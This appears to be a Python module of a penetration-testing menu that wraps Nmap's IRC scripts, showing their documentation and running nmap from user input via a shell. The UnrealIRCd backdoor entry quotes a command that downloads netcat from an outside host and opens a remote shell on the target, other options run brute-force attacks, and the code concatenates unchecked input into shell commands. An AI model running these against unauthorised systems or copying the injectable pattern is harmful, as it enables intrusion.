def irc(host_ip,desc):
    import sys
    import os
    import subprocess
    from ANSE import exit_msg
    desc = desc
    host_ip = host_ip
    os.system('clear')
    print("""\033[37m
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[0m\033[94m
 +Choose  your NSE script for IRC server:
     [1] irc-botnet-channels
     [2] irc-brute
     [3] irc-info
     [4] irc-sasl-brute
     [5] irc-unrealircd-backdoor
     [0] back\033[0m\033[37m
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[0m""")
    option=input("Enter your NSE script no:")
    os.system('clear')
    if option == "1":
        print("""\033[37m
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[0m\033[94m
File irc-botnet-channels

Script types: portrule
Categories: discovery, vuln, safe
Download: http://nmap.org/svn/scripts/irc-botnet-channels.nse

User Summary
Checks an IRC server for channels that are commonly used by malicious botnets.
Control the list of channel names with the irc-botnet-channels.channels script argument. The default list of channels is
    loic
    Agobot
    Slackbot
    Mytob
    Rbot
    SdBot
    poebot
    IRCBot
    VanBot
    MPack
    Storm
    GTbot
    Spybot
    Phatbot
    Wargbot
    RxBot

Script Arguments
irc-botnet-channels.channels
a list of channel names to check for.

Example Usage
    nmap -p 6667 --script=irc-botnet-channels <target>
    nmap -p 6667 --script=irc-botnet-channels --script-args 'irc-botnet-channels.channels={chan1,chan2,chan3}' <target>

Default Option Used in script:
nmap  -p 6667  --script [script name]  [arg] [host_ip] -oN [file_name]\033[0m\033[37m
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[0m""")
        port_select=input("Set Default option-port-6667[Y/N]:")
        if port_select == "Y" or port_select == "y":
            default_port="6667"
            arg=input("Enter argument if you need or press just enter:")
            file_name=input("Enter your file name to save:")
            output="-oN"+' '+"output/"+host_ip+"-"+file_name+".txt"
            subprocess.call('nmap --script irc-botnet-channels -p '+' '+default_port+' '+arg+' '+host_ip+' '+output,shell=True)
            irc(host_ip,desc)
        elif port_select == "N" or port_select == "n":
            custom_port=input("Enter your Custom port:")
            arg=input("Enter argument if you need or press just enter:")
            file_name=input("Enter your file name to save:")
            output="-oN"+' '+"output/"+host_ip+"-"+file_name+".txt"
            subprocess.call('nmap --script irc-botnet-channels -p '+' '+custom_port+' '+arg+' '+host_ip+' '+output,shell=True)
            irc(host_ip,desc)
        else:
            os.system('clear')
            print(desc)
            sys.exit(exit_msg)     
    elif option == "2":
        print("""\033[37m
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[0m\033[94m
File irc-brute

Script types: portrule
Categories: brute, intrusive
Download: http://nmap.org/svn/scripts/irc-brute.nse

User Summary
Performs brute force password auditing against IRC (Internet Relay Chat) servers.

Script Arguments
brute.credfile, brute.delay, brute.emptypass, brute.firstonly, brute.guesses, brute.mode, brute.passonly, brute.retries, brute.threads, brute.unique, brute.useraspass
See the documentation for the brute library.
creds.[service], creds.global
See the documentation for the creds library.
passdb, unpwdb.passlimit, unpwdb.timelimit, unpwdb.userlimit, userdb
See the documentation for the unpwdb library.

Example Usage
nmap --script irc-brute -p 6667 <ip>

Default Option Used in script:
nmap  -p 6667  --script [script name]  [arg] [host_ip] -oN [file_name]\033[0m\033[37m
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[0m""")
        port_select=input("Set Default option-port-6667[Y/N]:")
        if port_select == "Y" or port_select == "y":
            default_port="6667"
            arg=input("Enter argument if you need or press just enter:")
            file_name=input("Enter your file name to save:")
            output="-oN"+' '+"output/"+host_ip+"-"+file_name+".txt"
            subprocess.call('nmap --script irc-brute -p '+' '+default_port+' '+arg+' '+host_ip+' '+output,shell=True)
            irc(host_ip,desc)
        elif port_select == "N" or port_select == "n":
            custom_port=input("Enter your Custom port:")
            arg=input("Enter argument if you need or press just enter:")
            file_name=input("Enter your file name to save:")
            output="-oN"+' '+"output/"+host_ip+"-"+file_name+".txt"
            subprocess.call('nmap --script irc-brute -p '+' '+custom_port+' '+arg+' '+host_ip+' '+output,shell=True)
            irc(host_ip,desc)
        else:
            os.system('clear')
            print(desc)
            sys.exit(exit_msg)
    elif option == "3":
        print("""\033[37m
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[0m\033[94m
File irc-info

Script types: portrule
Categories: default, discovery, safe
Download: http://nmap.org/svn/scripts/irc-info.nse

User Summary
Gathers information from an IRC server.
It uses STATS, LUSERS, and other queries to obtain this information.

Example Usage
nmap -sV -sC <target>

Default Option Used in script:
nmap -sV --script [script name]  [arg] [host_ip] -oN [file_name]\033[0m\033[37m
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[0m""")
        port_select=input("Set Default option-no-port[Y/N]:")
        if port_select == "Y" or port_select == "y":
            arg=input("Enter argument if you need or press just enter:")
            file_name=input("Enter your file name to save:")
            output="-oN"+' '+"output/"+host_ip+"-"+file_name+".txt"
            subprocess.call('nmap -sV  --script irc-info'+' '+arg+' '+host_ip+' '+output,shell=True)
            irc(host_ip,desc)
        elif port_select == "N" or port_select == "n":
            custom_port=input("Enter your Custom port:")
            arg=input("Enter argument if you need or press just enter:")
            file_name=input("Enter your file name to save:")
            output="-oN"+' '+"output/"+host_ip+"-"+file_name+".txt"
            subprocess.call('nmap -sV --script irc-info -p '+' '+custom_port+' '+arg+' '+host_ip+' '+output,shell=True)
            irc(host_ip,desc)
        else:
            os.system('clear')
            print(desc)
            sys.exit(exit_msg)
    elif option == "4":
        print("""\033[37m
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[0m\033[94m
File irc-sasl-brute

Script types: portrule
Categories: brute, intrusive
Download: http://nmap.org/svn/scripts/irc-sasl-brute.nse

User Summary
Performs brute force password auditing against IRC (Internet Relay Chat) servers supporting SASL authentication.

Script Arguments
irc-sasl-brute.threads
the number of threads to use while brute-forcing. Defaults to 2.
passdb, unpwdb.passlimit, unpwdb.timelimit, unpwdb.userlimit, userdb
See the documentation for the unpwdb library.
creds.[service], creds.global
See the documentation for the creds library.
brute.credfile, brute.delay, brute.emptypass, brute.firstonly, brute.guesses, brute.mode, brute.passonly, brute.retries, brute.threads, brute.unique, brute.useraspass
See the documentation for the brute library.
smbdomain, smbhash, smbnoguest, smbpassword, smbtype, smbusername
See the documentation for the smbauth library.

Example Usage
nmap --script irc-sasl-brute -p 6667 <ip>

Default Option Used in script:
nmap  -p 6667  --script [script name]  [arg] [host_ip] -oN [file_name]\033[0m\033[37m
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[0m""")
        port_select=input("Set Default option-port-6667[Y/N]:")
        if port_select == "Y" or port_select == "y":
            default_port="6667"
            arg=input("Enter argument if you need or press just enter:")
            file_name=input("Enter your file name to save:")
            output="-oN"+' '+"output/"+host_ip+"-"+file_name+".txt"
            subprocess.call('nmap --script irc-sasl-brute -p '+' '+default_port+' '+arg+' '+host_ip+' '+output,shell=True)
            irc(host_ip,desc)
        elif port_select == "N" or port_select == "n":
            custom_port=input("Enter your Custom port:")
            arg=input("Enter argument if you need or press just enter:")
            file_name=input("Enter your file name to save:")
            output="-oN"+' '+"output/"+host_ip+"-"+file_name+".txt"
            subprocess.call('nmap --script irc-sasl-brute -p '+' '+custom_port+' '+arg+' '+host_ip+' '+output,shell=True)
            irc(host_ip,desc)
        else:
            os.system('clear')
            print(desc)
            sys.exit(exit_msg)
    elif option == "5":
        print("""\033[37m
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[0m\033[94m
File irc-unrealircd-backdoor

Script types: portrule
Categories: exploit, intrusive, malware, vuln
Download: http://nmap.org/svn/scripts/irc-unrealircd-backdoor.nse

User Summary
Checks if an IRC server is backdoored by running a time-based command (ping) and checking how long it takes to respond.
The irc-unrealircd-backdoor.command script argument can be used to run an arbitrary command on the remote system. Because of the nature of this vulnerability (the output is never returned) we have no way of getting the output of the command. It can, however, be used to start a netcat listener as demonstrated here:
  $ nmap -d -p6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='wget http://www.javaop.com/~ron/tmp/nc && chmod +x ./nc && ./nc -l -p 4444 -e /bin/sh' <target>
  $ ncat -vv localhost 4444
  Ncat: Version 5.30BETA1 ( http://nmap.org/ncat )
  Ncat: Connected to 127.0.0.1:4444.
  pwd
  /home/ron/downloads/Unreal3.2-bad
  whoami
  ron
Metasploit can also be used to exploit this vulnerability.
In addition to running arbitrary commands, the irc-unrealircd-backdoor.kill script argument can be passed, which simply kills the UnrealIRCd process.
Reference:
    http://seclists.org/fulldisclosure/2010/Jun/277
    http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt
    http://www.metasploit.com/modules/exploit/unix/irc/unreal_ircd_3281_backdoor
Script Arguments
irc-unrealircd-backdoor.kill
If set to 1 or true, kill the backdoored UnrealIRCd running.
irc-unrealircd-backdoor.wait
Wait time in seconds before executing the check. This is recommended to set for more reliable check (100 is good value).
irc-unrealircd-backdoor.command
An arbitrary command to run on the remote system (note, however, that you won't see the output of your command). This will always be attempted, even if the host isn't vulnerable. The pattern %IP% will be replaced with the ip address of the target host.

Example Usage
nmap -sV --script=irc-unrealircd-backdoor <target>

Default Option Used in script:
nmap -sV --script [script name]  [arg] [host_ip] -oN [file_name]\033[0m\033[37m
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[0m""")
        port_select=input("Set Default option-no-port[Y/N]:")
        if port_select == "Y" or port_select == "y":
            arg=input("Enter argument if you need or press just enter:")
            file_name=input("Enter your file name to save:")
            output="-oN"+' '+"output/"+host_ip+"-"+file_name+".txt"
            subprocess.call('nmap -sV  --script irc-unrealircd-backdoor'+' '+arg+' '+host_ip+' '+output,shell=True)
            irc(host_ip,desc)
        elif port_select == "N" or port_select == "n":
            custom_port=input("Enter your Custom port:")
            arg=input("Enter argument if you need or press just enter:")
            file_name=input("Enter your file name to save:")
            output="-oN"+' '+"output/"+host_ip+"-"+file_name+".txt"
            subprocess.call('nmap -sV --script irc-unrealircd-backdoor -p '+' '+custom_port+' '+arg+' '+host_ip+' '+output,shell=True)
            irc(host_ip,desc)
        else:
            os.system('clear')
            print(desc)
            sys.exit(exit_msg)
    elif option == "0":
        from ANSE import service_scan
        service_scan(host_ip, desc) 
    else:
        os.system('clear')
        print(desc)
        sys.exit(exit_msg)           